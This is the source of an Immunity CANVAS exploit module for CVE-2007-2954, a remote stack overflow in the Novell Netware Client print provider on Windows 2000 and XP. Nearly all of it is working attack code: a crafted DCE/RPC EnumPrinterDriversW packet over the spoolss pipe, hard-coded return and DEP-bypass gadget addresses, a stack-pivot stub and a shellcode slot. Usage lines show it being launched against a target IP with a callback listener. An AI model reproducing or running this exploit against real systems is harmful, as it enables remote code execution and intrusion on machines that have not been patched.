#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
import struct

if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from msrpcexploit import msrpcexploit
from libs.newsmb.libdcerpc import s_dce_raw_unistring

# GUI info
NAME='Novell Netware Client for Windows'
DESCRIPTION='Novell Netware Client for Windows Print Providor Stack Overflow'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Novell"
DOCUMENTATION['Date public']='08/06/2007'
DOCUMENTATION['References']='http://www.zerodayinitiative.com/advisories/ZDI-07-045.html'
DOCUMENTATION['Platforms Tested']=''
DOCUMENTATION["CVE Name"] = "CVE-2007-2954"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2954"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION['Notes']="""
"""
VERSION="0.1"

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP']

CHANGELOG="""
"""

NOTES="""
Usage:
./commandlineInterface.py -v 1 -p 5555 -i fromcreatethread
./exploits/netware_pp2/netware_pp2.py -v 4 -t 10.10.13.30 -l 10.10.13.1 -d 5555

Tested on:
Windows 2000 Professional SP4 French with Novell Netware Client for Windows v4.91 SP4
Windows XP Professional SP2 French with Novell Netware Client for Windows v4.91 SP4
(only v4.91 SP4 at the moment)

In nwspool.dll v4.91.4.0:
.text:5801D815                 push    offset aSoftwareNov_32 ; "SOFTWARE\\Novell\\Print\\Printer Data\\"
.text:5801D81A                 lea     eax, [ebp+var_20C]
.text:5801D820                 push    eax             ; Dest
.text:5801D821                 call    wcscpy
.text:5801D826                 add     esp, 8
.text:5801D829                 mov     ecx, [ebp+arg_0]
.text:5801D82C                 push    ecx             ; Source
.text:5801D82D                 lea     edx, [ebp+var_20C]
.text:5801D833                 push    edx             ; Dest
.text:5801D834                 call    wcscat
"""

targets = {
    0: ['Autoversioning (except for Windows XP SP2)',[]],
    1: ['Novell Netware Client on Windows 2000',0x38,[0x001ecad4]],
    2: ['Novell Netware Client on Windows XP SP0-SP1a',0x38,[0x00225028]],
    3: ['Novell Netware Client on Windows XP SP2 English (with DEP)',0x30,[0x6f895630,0x7c952080,0x7c91d3f8,0x201b0b9a]],
    4: ['Novell Netware Client on Windows XP SP2 French (with DEP)',0x30,[0x595c5630,0x7c962080,0x7c92d3f8,0x201dd79e]]
}

class theexploit(msrpcexploit):
    def __init__(self):
        msrpcexploit.__init__(self)
        self.version        = 0
        self.badstring      = '\0'
        self.UUID           = u'12345678-1234-abcd-ef00-0123456789ab'
        self.uuidversion    = u'1.0'
        self.targetfunction = 0xa # EnumPrinterDriversW
        self.name           = NAME
        self.subesp         = 1000
        self.listenerArgsDict['fromcreatethread'] =1

    def buildConnectionList(self):
        self.connectionList=['ncacn_np:%s[\\spoolss]'%(self.host)]
        return self.connectionList

    def testOS(self):
        app=self.engine.getModuleExploit('osdetect')
        app.link(self)
        self.log('target=%s->%s'%(self.target,app.target))
        result=app.run()
        if result==0:
            self.log('Unknown OS, automatic detection failed (try choosing a version)')
            return 0
        if app.result.find('2000')>-1:
            self.version=1
            self.log('OS vulnerable: %s'%result)
            return 1
        elif app.result.find('XP')>-1:
            self.log('OS vulnerable: %s'%result)
            self.version=2
            return 1
        else:
            self.log('OS not vulnerable: %s'%result)
        return 0

    def buildDcePacket(self):
        self.description,self.offset,self.eip= targets[self.version]
        #build overflowing string
        data=''
        data+='A'*(0x1ca-len(data))
        data+=struct.pack('<L',self.eip[0])
        data+='B'*4
        if self.version>=3: #Windows XP SP2
            data+=struct.pack('<L',self.eip[1])
            data+=struct.pack('<L',self.eip[3])
            data+='C'*16
            data+=struct.pack('<L',self.eip[2])
            data+='D'*4
            data+='\xeb\x1aEE' #esi is restored from here
        from MOSDEF import mosdef
        data+=mosdef.assemble('addl $0x%x,%%esp\nret'%(self.offset),'x86')
        #align data
        if (len(data)%2)!=0:
            data+='F'
        if (len(self.shellcode)%2)!=0:
            self.shellcode+='F'
        #build packet
        packet=''
        packet+=struct.pack('<L',1)                 #[unique]
        packet+=s_dce_raw_unistring(data)           #  pName
        packet+=struct.pack('<L',2)                 #[unique]
        packet+=s_dce_raw_unistring(self.shellcode) #  pEnvironment
        packet+=struct.pack('<L',1)                 #Level
        packet+=struct.pack('<L',3)                 #[unique]
        packet+=struct.pack('<LL',4,1)              #  pDriverInfo
        packet+=struct.pack('<L',4)                 #cbBuf
        #return packet
        return packet

    def displayVersions(self):
        i=0
        for listline in targets.values():
            print "%d: %s"%(i,listline[0])
            i=i+1

if __name__=='__main__':
    app = theexploit()
    ret=standard_callback_commandline(app)
